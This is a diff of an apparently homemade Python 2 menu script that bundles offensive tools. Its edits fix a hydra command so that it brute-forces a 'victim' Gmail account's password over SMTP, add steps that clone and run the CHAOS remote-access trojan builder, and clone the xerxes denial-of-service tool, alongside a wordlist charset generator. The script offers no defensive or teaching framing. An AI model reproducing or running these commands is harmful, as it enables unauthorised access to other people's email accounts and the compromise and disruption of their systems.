@@ -59,11 +59,7 @@ if option == 3:
         print "11. Custom"
 
   type = input(">")
-  while type != 1 or 2 or 3 or 4 or 5 or 6 or 7 or 8 or 9 or 10 or 11:
-                 print "\n\n\nPlease select a vallid option."
-                 sleep(4)
-                 a()
-                 type = input(">")
+  print ""
   if type == 1:
                  charset = "1234567890"
   if type == 2:
@@ -86,6 +82,7 @@ if option == 3:
                  charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@#$&*()'%-+=/;:,.€£¥_^[]{}§|~…<>!?\ "
   if type == 11:
                  charset = raw_input("Type all charecters to be used: ")
+
   print ("using charset "+charset+".")
   min = raw_input("Minimum Password Leangth: ")
   max = raw_input("Maximum Password Leangth: ")
@@ -95,13 +92,15 @@ if option == 4:
    os.system('apt-get install hydra')
    victim = raw_input("Victim: ")
    lc = raw_input("File Location of Password List: ")
-   os.system('hydra -S -l '+victim+' -P '+lc+' -v -V -e ns -s 465 stmp.gmail.com stmp')
+   os.system('hydra -S -l '+victim+' -P '+lc+' -v -V -e ns -s 465 smtp.gmail.com smtp')
 if option == 5:
    os.system('cd')
    os.system('git clone https://github.com/tiagorlampert/CHAOS')
    os.system('apt-get install golang upx-ucl -y')
    os.system('cd')
-   os.system('cd CHAOS')
+   os.system('cd Desktop/lazylinux/CHAOS')
+   os.system('chmod +x CHAOS.go')
+   os.system('go run CHAOS.go')
 if option == 6:
    os.system('cd')
    os.system('git clone https://github.com/zanyarjamal/xerxes')
